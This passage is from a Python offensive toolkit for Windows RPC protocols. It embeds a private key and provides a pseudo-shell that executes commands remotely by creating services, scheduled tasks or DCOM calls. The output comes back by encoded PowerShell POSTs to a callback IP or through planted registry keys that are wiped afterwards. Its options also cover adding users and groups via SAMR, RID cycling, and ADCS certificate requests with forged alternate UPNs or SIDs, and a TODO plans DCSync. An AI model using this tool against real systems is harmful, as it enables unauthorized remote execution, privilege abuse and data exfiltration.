18mZu0Py0se9/E3Mxt57/5amANNikzC+ZJQ+zRPA4l5FlRio/tVOd5bzxoXsS4Mo
zQ16vtAVJl4MqGu1+hqb6r5PiGmWs+CIO3Xd5PDLdJg/zx21bKnurlUYJ/zFNEn6
PcNOTP8Sn92rIKTxaj/+4cuCSuGP+NUlF5kOXmZkQxCb853SGIofYwdwhSAZPMt0
gyI3mCMw1euMVAcH/AnQ7KQUnE7GwldkaU44FQECggEAGJXaQ8Flpbkc0jspxfaI
nBwOsETsdxc4r3altnEthoawVTb9oFAR5IRz1wgOtkOkBMut/4znYImLAaNvZBJ9
SL+QSCIWz1HoaNKAhBilRnTltzIJLtd22Le9CU/OJ9tIF3uq+Mt3UjPL0jThEj0b
Y4XhfxMMMEPzFFE4JVd3Xryc/iBycjreW11ACYlRvEFUdkJ3pselpNDPtDnIcaWs
vt7OBtHV8hNgODVEi8n7+NdTGehtxFkytsUNVuyEfbDOTNXqjhP6blt8d3zbNLLz
kVpXrhbdmqOEMCEt13A75PeBvPJenz9Qg9qipjETvS5axLHTi9fjE/h8xTP7ACGz
SQKCAQEAqDVa/CJladdGrNOBXhC0fc6sJBFQR/G0mbpBUwylWZwO6dylZa/A3LPm
vx6ZJ3ALVGOmF7Vl3FAtzqjeqeh8yC2gP7z0etWKcqLOiC3sU7g+UAWByramFqYZ
y6NagS9i0DKBcbGmqDKBIkkd/RmKyz+5W/X9xqTbZC7WXcBZ8/DFAM3FBILMYXMt
ZGurbEFAVvPbcruqe2yR4rkg60oC4eZhs3XECzvNR3oFzkJTHghyQXgdJtp2wK/D
XKyeasenIYQIySHSMq3BJbkkDw/QgjfTN5jSIb5RX74Za9sLpjDR6QfDOCrPXxrI
aUEg6QWenzVKGDu459Jh4GgOvK/kqg==
-----END PRIVATE KEY-----'''
regCleaned = False

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
	def do_POST(self):
		global finalData, insideBlock, output, haveOutput

		length = int(self.headers['Content-Length'])
		data = self.rfile.read(length).decode('utf-8')
		if data == '|':
			if insideBlock:
				insideBlock = False
				output = base64.b64decode(finalData).decode('utf-8')
				finalData = ""
				haveOutput = True
			else:
				insideBlock = True
		else:
			finalData += data

		self.send_response(200)
		self.end_headers()
	
	def log_message(self, format, *args):
		# Override to suppress logging
		return

def startServer(ip, port):
	global stopEvent, sslCert, sslKey
	with open("server.key", "w+") as f:
		f.write(sslKey)
	with open("server.crt", "w+") as f:
		f.write(sslCert)
	addr = (ip, int(port))
	httpd = HTTPServer(addr, SimpleHTTPRequestHandler)
	httpd.socket = ssl.wrap_socket(httpd.socket, keyfile = 'server.key', certfile = 'server.crt', server_side = True)
	httpd.socket.setblocking(0)
	while not stopEvent.is_set():
		try:
			httpd.handle_request()
		except socket.error:
			time.sleep(0.1)
	httpd.server_close()
	os.remove("server.key")
	os.remove("server.crt")

def pseudoShell(ip, user, pwd, domain, nthash, aesKey, ccache, rceMethod, outMethod, comMethod, callbackIP, callbackPort = 80, serviceName = 'MyService', taskName = 'MyTask', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	print_yellow(f"[*] Starting Pseudo-Shell [{rceMethod}]")
	print_yellow("---")
	print()

	# All commands are executed initially through C:\Windows\System32\cmd.exe /c <CMD>
	# Final command:
	#	C:\Windows\System32\cmd.exe /c powershell -e base64encode($out = & cmd /c <CMD> *>&1; $out = $out -join "`n"; $out = $out + "`n"; <SendOutput>)

	global output, haveOutput, sThread, stopEvent, regCleaned
	try:
		if outMethod == 'HTTPS' and (callbackIP == '' or callbackPort == ''):
			print("[-] Callback IP and port not provided", file = sys.stderr)
			return
		
		while True:
			
			# Build command

			cmd = input(f"[{domain}/{user}@{ip}]$> ")
			if cmd == "exit":
				break

			cmd = f'$out = & cmd /c {cmd} *>&1; $out = $out -join "`n"; $out = $out + "`n"; $encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out)); '
			
			maxChunkSize = 1024 * 1024

			if outMethod == 'HTTPS': # Wrap output via HTTPS
				
				cmd += '''$maxChunkSize = %s; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; irm -Uri "https://%s:%s" -Method Post -Body "|"; $chunks = [System.Collections.Generic.List[string]]::new(); for ($i = 0; $i -lt $encodedData.Length; $i += $maxChunkSize) { $chunks.Add($encodedData.Substring($i, [Math]::Min($maxChunkSize, $encodedData.Length - $i))) }; ($chunks | ForEach-Object { irm -Uri "https://%s:%s" -Method Post -Body "$_"}); irm -Uri "https://%s:%s" -Method Post -Body "|"; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = [System.Net.ServicePointManager]::DefaultCertificateValidationCallback''' % (maxChunkSize, callbackIP, callbackPort, callbackIP, callbackPort, callbackIP, callbackPort)
				finalCmd = "powershell -e " + base64.b64encode(cmd.replace("\n", "\r\n").encode("utf-16le")).decode()
				if sThread == None:
					sThread = threading.Thread(target = startServer, args = (callbackIP, callbackPort))
					sThread.daemon = True
					sThread.start()
			
			elif outMethod == 'REGISTRY': # Wrap output via registry HKLM:\SOFTWARE\Windows into keys LogonX
				
				cmd += '''$maxChunkSize = %s; $chunks = [System.Collections.Generic.List[string]]::new(); for ($i = 0; $i -lt $encodedData.Length; $i += $maxChunkSize) { $chunks.Add($encodedData.Substring($i, [Math]::Min($maxChunkSize, $encodedData.Length - $i))) }; New-Item -Path HKLM:\SOFTWARE\Windows -Force | Out-Null; $i = 0; ($chunks | ForEach-Object { $i += 1; New-ItemProperty -Path HKLM:\SOFTWARE\Windows -Name "Logon$i" -Value $_ -PropertyType String -Force }); New-ItemProperty -Path HKLM:\SOFTWARE\Windows -Name "End" -Value 1 -PropertyType DWord -Force''' % maxChunkSize
				finalCmd = "powershell -e " + base64.b64encode(cmd.replace("\n", "\r\n").encode("utf-16le")).decode()
			
			else: # Wrap output via named pipe
				
				pass

			# Execute command

			originalSTDOUT = sys.stdout
			originalSTDERR = sys.stderr
			sys.stdout = StringIO()
			capturedSTDERR = StringIO()
			sys.stderr = capturedSTDERR
			try:
				if rceMethod == "SVCCTL":
					RCESVCCTL(ip, user, pwd, domain, nthash, aesKey, ccache, finalCmd, serviceName, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
				elif rceMethod == "ITaskSchedulerService":
					RCEITaskSchedulerService(ip, user, pwd, domain, nthash, aesKey, ccache, finalCmd, taskName, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
				elif rceMethod == "DCOM1":
					RCEDCOM1(ip, user, pwd, domain, nthash, aesKey, ccache, finalCmd, comMethod, unauthTransport = False, unauthBinding = False)
				else:
					RCEDCOM2(ip, user, pwd, domain, nthash, aesKey, ccache, finalCmd, unauthTransport = False, unauthBinding = False)
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			err = capturedSTDERR.getvalue()
			sys.stderr = originalSTDERR
			if err.find("[-] Got error") != -1:
				print(err)
				return

			# Retrieve output

			if outMethod == 'HTTPS':

				while not haveOutput:
					time.sleep(0.5)
				print(output)
				output = ''
				haveOutput = False
				if sThread != None:
					stopEvent.set()
					sThread.join()
					stopEvent = threading.Event()
					sThread = None

			elif outMethod == 'REGISTRY':

				originalSTDOUT = sys.stdout
				originalSTDERR = sys.stderr
				capturedSTDOUT = StringIO()
				sys.stdout = capturedSTDOUT
				capturedSTDERR = StringIO()
				sys.stderr = capturedSTDERR
				i = 0
				regComplete = False
				b64Data = ''
				while True:
					try:
						if not regComplete:
							regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, 'reg query HKLM\SOFTWARE\Windows /v End', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
							output = capturedSTDERR.getvalue()
							capturedSTDERR.truncate(0)
							capturedSTDERR.seek(0)
							if output.find("Entry does not exist") == -1:
								regComplete = True
							else:
								time.sleep(1)
						else:
							i += 1
							regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, f'reg query HKLM\SOFTWARE\Windows /v Logon{i}', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
							err = capturedSTDERR.getvalue()
							capturedSTDERR.truncate(0)
							capturedSTDERR.seek(0)
							out = capturedSTDOUT.getvalue()
							capturedSTDOUT.truncate(0)
							capturedSTDOUT.seek(0)
							if err.find("Entry does not exist") != -1:
								regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, 'reg delete HKLM\SOFTWARE\Windows /va', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
								regCleaned = True
								break
							else:
								res = out.split("REG_SZ")
								if (len(res) > 1):
									b64Data += res[1].replace(' ', '')
								else:
									b64Data += ''
					except:
						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						raise
				sys.stdout = originalSTDOUT
				print(base64.b64decode(b64Data).decode())

			else: # NAMEDPIPE
				print("[-] TODO")
				return
	
	except KeyboardInterrupt:
		if sThread != None:
			stopEvent.set()
			sThread.join()
			stopEvent = threading.Event()
			sThread = None
		if not regCleaned:
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, 'reg delete HKLM\SOFTWARE\Windows /va', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
				regCleaned = True
			except:
				pass
			sys.stdout = originalSTDOUT
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		if sThread != None:
			stopEvent.set()
			sThread.join()
			stopEvent = threading.Event()
			sThread = None
		if not regCleaned:
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				regCMD(ip, user, pwd, domain, nthash, aesKey, ccache, 'reg delete HKLM\SOFTWARE\Windows /va', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None)
				regCleaned = True
			except:
				print("[-] Failed to clean registry HKLM\SOFTWARE\Windows", file = sys.stderr)
			sys.stdout = originalSTDOUT

##################################################
#                     MAIN                       #
##################################################

def print_red(text):
	print("\033[91m" + text + "\033[0m")

def print_yellow(text):
	print("\033[93m" + text + "\033[0m")

def parseTarget(target):
	import ipaddress, re

	cidrRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/[0-9]{1,3}$"
	isFile = False
	isMultipleIPs = False

	res = []

	tmp = []
	try:
		with open(target, "r") as f:
			tmp = [line.rstrip('\n') for line in f.readlines()]
			isFile = True
	except:
		pass

	if not isFile:
		if target.find(",") != -1:
			tmp = target.split(",")
			isMultipleIPs = True

	if not isFile and not isMultipleIPs:
		tmp = [target]

	for entry in tmp:
		if re.match(cidrRegex, entry):
			network = ipaddress.ip_network(entry, strict = False)
			for ip in network:
				res.append(str(ip))
		else:
			res.append(entry)
	
	return res

def maybeSleep(deep = True, inAction = False):
	global THROTTLE, THROTTLE_DEEP
	if deep:
		if THROTTLE_DEEP != None:
			print("\n--- SLEEPING ---\n")
			time.sleep(THROTTLE_DEEP)
	else:
		if THROTTLE != None and THROTTLE_DEEP == None:
			print("--- SLEEPING ---\n")
			time.sleep(THROTTLE)
	if inAction and THROTTLE_DEEP == None:
		print()

def add_arguments(parser):
	auth_group = parser.add_argument_group('[[ Authentication ]]')
	auth_group.add_argument("--alternateBinding", help = "Alternate String Binding to access RPC interface")
	auth_group.add_argument("--alternateInterface", help = "Alternate RPC interface in the form of <UUID>:<Version>")
	auth_group.add_argument("--unauthTransport", help = "Do not authenticate through transport protocol", action = "store_true")
	auth_group.add_argument("--unauthBinding", help = "Do not authenticate through binding", action = "store_true")

	msrpce_group = parser.add_argument_group('[[ MS-RPCE-C706 ]] Remote Procedure Call Protocol Extensions')
	msrpce_group.add_argument("--listEndpoints", help = "List exposed RPC endpoints through EPMAPPER interface", action = "store_true")
	msrpce_group.add_argument("--searchUnauthBindings", help = "Search unauthenticated bindings through exposed RPC endpoints", action = "store_true")
	msrpce_group.add_argument("--getOSArch", help = "Get target(s) Windows OS architecture (x86/x64)", action = "store_true")

	msscmr_group = parser.add_argument_group('[[ MS-SCMR ]] Service Control Manager Remote Protocol')
	msscmr_group.add_argument("--isAdmin", help = "Check if current user is admin through SVCCTL interface", action = "store_true")
	msscmr_group.add_argument("--cmdSVCCTL", help = "System command to execute through SVCCTL interface")
	msscmr_group.add_argument("--serviceName", help = "Service name to create for executing system command. Default = MyService", default = 'MyService')
	msscmr_group.add_argument("--startService", help = "Service to start through SVCCTL interface")
	msscmr_group.add_argument("--listServices", help = "List running services and by which users through SVCCTL interface", action = "store_true")

	mstsch_group = parser.add_argument_group('[[ MS-TSCH ]] Task Scheduler Service Remoting Protocol')
	mstsch_group.add_argument("--cmdITaskSchedulerService", help = "System command to execute through ITaskSchedulerService interface")
	mstsch_group.add_argument("--taskName", help = "Scheduled Task name to create to execute system command. Default = MyTask", default = 'MyTask')
	mstsch_group.add_argument("--listScheduledTasks", help = "List Scheduled Tasks and by which users through ITaskSchedulerService interface", action = "store_true")
	mstsch_group.add_argument("--cmdATSVC", help = "System command to execute through ATSVC interface")

	msdcom_group = parser.add_argument_group('[[ MS-DCOM ]] Distributed Component Object Model (DCOM) Remote Protocol')
	msdcom_group.add_argument("--cmdDCOM1", help = "System command to execute through ShellWindows/ShellBrowserWindow/MMC20 COM objects")
	msdcom_group.add_argument("--cmdDCOM1Method", help = "COM object to use for system command. Default = MMC20", choices = ["ShellWindows", "ShellBrowserWindow", "MMC20"], default = "MMC20")
	msdcom_group.add_argument("--cmdDCOM2", help = "System command to execute through WbemLevel1Login COM object")
	msdcom_group.add_argument("--ADCSConfigCSRA", help = "Enumerate Active Directory Certificate Services (ADCS) Certification Authority information through CertAdminD2 COM object with provided <CAName>,<CAFQDN>")

	mststs_group = parser.add_argument_group('[[ MS-TSTS ]] Terminal Services Terminal Server Runtime Interface Protocol')
	mststs_group.add_argument("--listRDSSessions", help = "List Remote Desktop Services sessions through TermSrvEnumeration/TermSrvSession interfaces", action = "store_true")
	mststs_group.add_argument("--listProcesses", help = "List running processes through LegacyAPI interface", action = "store_true")

	mssrvs_group = parser.add_argument_group('[[ MS-SRVS ]] Server Service Remote Protocol')
	mssrvs_group.add_argument("--listSessions", help = "List remote sessions through SRVSVC interface", action = "store_true")
	mssrvs_group.add_argument("--listShares", help = "List remote shares through SRVSVC interface", action = "store_true")

	mswkst_group = parser.add_argument_group('[[ MS-WKST ]] Workstation Service Remote Protocol')
	mswkst_group.add_argument("--listLoggedIn", help = "List logged in users through WKSSVC interface", action = "store_true")

	msrrp_group = parser.add_argument_group('[[ MS-RRP ]] Windows Remote Registry Protocol')
	msrrp_group.add_argument("--regCMD", help = '''Registry cmd through WINREG interface in the form of
			reg query '<KeyName>' [/v '<EntryName>'|/ve|/s]
			reg add '<KeyName>' /v '<EntryName>'|/ve /t <EntryType> /d '<EntryData>'
			reg delete '<KeyName>' /v '<EntryName>'|/ve|/va
			reg save '<KeyName>' '<RemoteOutputPath>\'''')
	msrrp_group.add_argument("--listRegSessions", help = "List remote sessions through WINREG interface by querying HKU\<SID>", action = "store_true")
	msrrp_group.add_argument("--listRegSD", help = "List remote registries Security Descriptor through WINREG interface", choices = ["HKLM", "HKCU", "HKCR", "HKU", "HKCC"])
	msrrp_group.add_argument("--ADCSConfigRRP", help = "Enumerate Active Directory Certificate Services (ADCS) Certification Authority information through registries with provided <CAName>,<CAFQDN>")

	mslsatlsad_group = parser.add_argument_group('[[ MS-LSAT/MS-LSAD ]] Local Security Authority (Translation Methods/Domain Policy) Remote Protocol')
	mslsatlsad_group.add_argument("--SIDToName", help = "Lookup name of provided SID through LSARPC interface")
	mslsatlsad_group.add_argument("--NameToSID", help = "Lookup SID of provided SAM Account Name through LSARPC interface")
	mslsatlsad_group.add_argument("--ridCycling", help = "Enumerate accounts with RID Cycling from provided RID range through LSARPC interface. Example: 500-3000")

	mssamr_group = parser.add_argument_group('[[ MS-SAMR ]] Security Account Manager (SAM) Remote Protocol (Client-to-Server)')
	mssamr_group.add_argument("--samrCMD", help = '''Cmd through SAMR interface in the form of
			net user
			net user '<UserName>'
			net user '<UserName>' /del
			net user '<UserName>' /active:yes
			net user '<UserName>' /active:no
			net user '<UserName>' [<B64Pwd>]:[<NT>] /add
			net user '<UserName>' [<B64CurrentPwd>]:[<B64NewPwd>] [<CurrentLM>]:[<NewLM>] [<CurrentNT>]:[<NewNT>] [/injectSAM]
			net computer
			net computer '<ComputerName>'
			net computer '<ComputerName>' /del
			net computer '<ComputerName>' /active:yes
			net computer '<ComputerName>' /active:no
			net computer '<ComputerName>' [<B64Pwd>]:[<NT>] /add
			net computer '<ComputerName>' [<B64CurrentPwd>]:[<B64NewPwd>] [<CurrentLM>]:[<NewLM>] [<CurrentNT>]:[<NewNT>] [/injectSAM]
			net group
			net group '<GroupName>'
			net group '<GroupName>' /del
			net group '<GroupName>' /add
			net group '<GroupName>' '<UserName>' /add
			net group '<GroupName>' '<UserName>' /del
			net localgroup
			net localgroup '<GroupName>'
			net localgroup '<GroupName>' /del
			net localgroup '<GroupName>' /add
			net localgroup '<GroupName>' '<UserName>' /add
			net localgroup '<GroupName>' '<UserName>' /del
			net accounts''')

	msicpr_group = parser.add_argument_group('[[ MS-ICPR ]] ICertPassage Remote Protocol')	
	msicpr_group.add_argument("--requestTemplate", help = "ADCS certificate template name to request")
	msicpr_group.add_argument("--CAName", help = "ADCS Certification Authority name to send request")
	msicpr_group.add_argument("--outFile", help = "Output file name for the PFX certificate (No password will be set)")
	msicpr_group.add_argument("--renew", help = "Use renewal request. Default = False", action = "store_true")
	msicpr_group.add_argument("--onBehalfOf", help = "On behalf user to request (<DomainNotFQDN>\<User>) from a Certificate Request Agent certificate. Default = Current user")
	msicpr_group.add_argument("--pfxFile", help = "PFX file for renewal/on-behalf-of request")
	msicpr_group.add_argument("--pfxPwd", help = "PFX password for renewal/on-behalf-of request (if set from certificate)")
	msicpr_group.add_argument("--subject", help = "Distinguished name of subject to include into certificate. Default = CN=<CurrentUser>")
	msicpr_group.add_argument("--altDNS", help = "Alternative DNS to include into SAN")
	msicpr_group.add_argument("--altUPN", help = "Alternative UPN in the form of <User>@<Domain> to include into SAN")
	msicpr_group.add_argument("--altSID", help = "Alternative Object SID to include into SAN")
	msicpr_group.add_argument("--archiveKey", help = "Send RSA private key generated through Certificate Signing Request (CSR) to Key Archival. Default = False", action = "store_true")
	msicpr_group.add_argument("--keySize", help = "Length of RSA private key to generate through Certificate Signing Request (CSR). Default = 2048", default = 2048)
	msicpr_group.add_argument("--applicationPolicies", help = "Application Policies to include through Certificate Signing Request (CSR). Work only for templates with Template Schema Version = 1 and Enrollee Supplies Subject = True. Commas separated list. Example: Client Authentication,Certificate Request Agent")

	pshell_group = parser.add_argument_group('[[ Pseudo-Shell ]] Get a Pseudo-Shell through HTTPS, registries or named pipe')
	pshell_group.add_argument("--shell", help = "Start a Pseudo-Shell", action = "store_true")
	pshell_group.add_argument("--rceMethod", help = "Which RCE method to use. Default = SVCCTL", choices = ["SVCCTL", "ITaskSchedulerService", "DCOM1", "DCOM2"], default = "SVCCTL")
	pshell_group.add_argument("--rceServiceName", help = "Service name to create for system command with SVCCTL method. Default = MyService", default = "MyService")
	pshell_group.add_argument("--rceTaskName", help = "Scheduled Tasks name to create for system command with ITaskSchedulerService method. Default = MyTask", default = "MyTask")
	pshell_group.add_argument("--outMethod", help = "Communication method. Default = REGISTRY", choices = ["HTTPS", "REGISTRY", "NAMEDPIPE"], default = "REGISTRY")
	pshell_group.add_argument("--outHTTPCallback", help = "IP and port to callback for HTTP communication from <IP>:<Port>", default = ':')
	pshell_group.add_argument("--DCOM1Method", help = "COM object to use for system command. Default = MMC20", choices = ["ShellWindows", "ShellBrowserWindow", "MMC20"], default = "MMC20")

THROTTLE = None
THROTTLE_DEEP = None
def handle_arguments(args):
	targets = ['LOCAL']
	if args.target != None:    
		targets = parseTarget(args.target)
	if args.shuffle:    
		random.shuffle(targets)
	if args.throttle != None:
		global THROTTLE
		THROTTLE = args.throttle
	if args.throttleDeep != None:
		global THROTTLE_DEEP
		THROTTLE_DEEP = args.throttleDeep

	firstTarget = True

	for target in targets:
		if not firstTarget:
			maybeSleep(deep = False)
		else:
			firstTarget = False

		print_red("|---------------------------")
		print_red(f"| {target}")
		print_red("|---------------------------")
		print()

		# RPC Signing
		# 	Negotiated and implemented
		# Channel Binding
		# 	Not supported by RPC protocol

		# [[ MS-RPCE-C706 ]] Remote Procedure Call Protocol Extensions
		if args.listEndpoints:
			endpoints = listEndpoints(target)
			maybeSleep(inAction = True)
		if args.searchUnauthBindings:
			searchUnauthBindings(target)
			maybeSleep(inAction = True)
		if args.getOSArch:
			getOSArch(target)
			maybeSleep(inAction = True)
		
		# [[ MS-SCMR ]] Service Control Manager Remote Protocol
		if args.isAdmin:
			res = isAdmin(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.cmdSVCCTL != None:
			RCESVCCTL(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cmdSVCCTL, args.serviceName, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.startService != None:
			startService(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.startService, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.listServices:
			listServices(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)

		# [[ MS-TSCH ]] Task Scheduler Service Remoting Protocol
		if args.cmdITaskSchedulerService != None:
			RCEITaskSchedulerService(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cmdITaskSchedulerService, args.taskName, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.listScheduledTasks:
			listScheduledTasks(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.cmdATSVC != None:
			RCEATSVC(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cmdATSVC, 1, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		
		# [[ MS-DCOM ]] Distributed Component Object Model (DCOM) Remote Protocol
		if args.cmdDCOM1 != None:
			RCEDCOM1(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cmdDCOM1, args.cmdDCOM1Method, args.unauthTransport, args.unauthBinding)
			maybeSleep(inAction = True)	
		if args.cmdDCOM2 != None:
			RCEDCOM2(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cmdDCOM2, args.unauthTransport, args.unauthBinding)
			maybeSleep(inAction = True)
		if args.ADCSConfigCSRA != None:
			_ = getCAConfigCSRA(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, *args.ADCSConfigCSRA.split(','), args.unauthTransport, args.unauthBinding)
			maybeSleep(inAction = True)
		
		# [[ MS-TSTS ]] Terminal Services Terminal Server Runtime Interface Protocol
		if args.listRDSSessions:
			listRDSSessions(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding)
			maybeSleep(inAction = True)
		if args.listProcesses:
			listProcesses(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		
		# [[ MS-SRVS ]] Server Service Remote Protocol
		if args.listSessions:
			listSessions(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.listShares:
			sharesInfo = listShares(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		
		# [[ MS-WKST ]] Workstation Service Remote Protocol
		if args.listLoggedIn:
			listLoggedIn(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)

		# [[ MS-RRP ]] Windows Remote Registry Protocol
		if args.regCMD != None:
			regCMD(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.regCMD, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.listRegSessions:
			listRegSessions(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.listRegSD:
			listRegSD(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.listRegSD, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.ADCSConfigRRP != None:
			_ = getCAConfigRRP(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, *args.ADCSConfigRRP.split(','), args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)

		# [[ MS-LSAT/MS-LSAD ]] Local Security Authority (Translation Methods/Domain Policy) Remote Protocol
		if args.SIDToName != None:
			name = SIDToName(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.SIDToName, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.NameToSID != None:
			sid = NameToSID(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.NameToSID, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		if args.ridCycling != None:
			ridCycling(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, *args.ridCycling.split('-'), args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)

		# [[ MS-SAMR ]] Security Account Manager (SAM) Remote Protocol (Client-to-Server)
		if args.samrCMD != None:
			samrCMD(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.samrCMD, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		
		# [[ MS-ICPR ]] ICertPassage Remote Protocol
		if args.requestTemplate != None:
			requestCertificate(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.requestTemplate, args.CAName, args.outFile, args.renew, args.onBehalfOf, args.pfxFile, args.pfxPwd, args.subject, args.altDNS, args.altUPN, args.altSID, args.archiveKey, args.keySize, args.applicationPolicies, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)
		
		# [[ Pseudo-Shell ]] Get a Pseudo-Shell through HTTPS, registries or named pipe
		if args.shell:
			pseudoShell(target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.rceMethod, args.outMethod, args.DCOM1Method, *args.outHTTPCallback.split(':'), args.rceServiceName, args.rceTaskName, args.unauthTransport, args.unauthBinding, args.alternateBinding, args.alternateInterface)
			maybeSleep(inAction = True)

##################################################
#                     TODO                       #
##################################################

# - RCE with output through Named Pipes
# - Implement DCSync
# - Implement coerces
# - Implement service/scheduled task edition/stop
# - Implement ESC7 methods